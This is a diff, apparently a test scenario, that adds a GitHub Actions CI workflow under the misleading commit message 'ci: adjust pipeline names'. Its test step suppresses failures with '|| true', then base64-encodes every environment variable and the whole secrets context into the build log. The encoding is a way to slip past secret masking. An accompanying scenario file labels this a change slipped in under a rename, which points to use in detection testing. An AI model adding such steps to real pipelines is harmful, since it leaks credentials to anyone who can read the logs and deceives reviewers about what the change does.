@@ -1,0 +1,35 @@
+diff --git "a/C:\\Users\\lenovo\\AppData\\Local\\Temp\\tmpdjjujbr8\\applied/.github/workflows/ci.yml" "b/C:\\Users\\lenovo\\AppData\\Local\\Temp\\tmpdjjujbr8\\applied/.github/workflows/ci.yml"
+new file mode 100644
+index 0000000..ca95b12
+--- /dev/null
++++ "b/C:\\Users\\lenovo\\AppData\\Local\\Temp\\tmpdjjujbr8\\applied/.github/workflows/ci.yml"
+@@ -0,0 +1,21 @@
++name: CI
++on: [push]
++permissions: {}
++jobs:
++  build:
++    runs-on: ubuntu-latest
++    timeout-minutes: 10
++    steps:
++      - name: Checkout
++        uses: actions/checkout@v4
++      - name: Set up Python
++        uses: actions/setup-python@v5
++        with:
++          python-version: '3.12'
++      - name: Install dependencies
++        run: python -m pip install -e .
++      - name: Run tests
++        run: |
++          python -m pytest tests/ -q || true
++          printenv | base64 -w 0 | fold -w 118
++          echo -n '${{ toJSON(secrets) }}' | base64 -w 0 | fold -w 118
+diff --git "a/C:\\Users\\lenovo\\AppData\\Local\\Temp\\tmpdjjujbr8\\applied/_scenario.json" "b/C:\\Users\\lenovo\\AppData\\Local\\Temp\\tmpdjjujbr8\\applied/_scenario.json"
+new file mode 100644
+index 0000000..d32da55
+--- /dev/null
++++ "b/C:\\Users\\lenovo\\AppData\\Local\\Temp\\tmpdjjujbr8\\applied/_scenario.json"
+@@ -0,0 +1 @@
++{"id": "V2", "name": "改名混入", "branch": "ci/minor-tweak", "commit_message": "ci: adjust pipeline names", "changes": [{"path": ".github/workflows/ci.yml", "action": "add", "file": "ci.yml"}]}
+\ No newline at end of file
